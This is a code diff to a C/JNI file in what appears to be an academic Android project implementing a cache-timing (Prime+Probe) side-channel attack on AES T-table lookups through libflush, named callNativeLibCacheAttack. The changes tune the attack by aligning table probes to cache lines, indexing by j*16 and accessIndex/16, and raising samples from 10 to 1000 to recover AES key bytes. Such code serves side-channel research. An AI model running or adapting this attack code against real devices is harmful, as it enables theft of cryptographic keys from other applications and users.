@@ -31,8 +31,8 @@
 
 #define BIND_TO_CPU 0
 #define BIND_THREAD_TO_CPU 1
-#define AES_TABLE_LENGTH 256    // the block num of aes look up table
-#define AES_SAMPLE_SUM 10       // sample sum
+#define AES_TABLE_LENGTH 16    // the block num of aes look up table
+#define AES_SAMPLE_SUM 1000       // sample sum
 #define AES_KEY_MAX 256         // the possibility of key
 #define AES_KEY_LENGTH 16       // the length of key
 #define AES_PLAINTEXT_LENGTH 16 // the length of plaintext
@@ -200,19 +200,19 @@ jint Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(
 
     for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++) {
       sample[i]->t0_time[j0] =
-          getPPTime(env, libflush_session, inaes, tmp, tables.t0_si[j0]);
+          getPPTime(env, libflush_session, inaes, tmp, tables.t0_si[j0 * 16]);
     }
     for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++) {
       sample[i]->t1_time[j1] =
-          getPPTime(env, libflush_session, inaes, tmp, tables.t1_si[j1]);
+          getPPTime(env, libflush_session, inaes, tmp, tables.t1_si[j1 * 16]);
     }
     for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++) {
       sample[i]->t2_time[j2] =
-          getPPTime(env, libflush_session, inaes, tmp, tables.t2_si[j2]);
+          getPPTime(env, libflush_session, inaes, tmp, tables.t2_si[j2 * 16]);
     }
     for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
       sample[i]->t3_time[j3] =
-          getPPTime(env, libflush_session, inaes, tmp, tables.t3_si[j3]);
+          getPPTime(env, libflush_session, inaes, tmp, tables.t3_si[j3 * 16]);
     }
     LOGI("%d", i);
   }
@@ -488,7 +488,7 @@ uint64_t *getValidSample(int index, unsigned char keyi, aesSample **as,
 #endif
     unsigned char validPlaintext = as[i]->plaintext[index];
     unsigned char accessIndex = keyi ^ validPlaintext;
-    int validAccessArrayIndex = accessIndex;
+    int validAccessArrayIndex = accessIndex / 16;
     uint64_t *validTable;
     switch (tableIndex) {
     case 0:
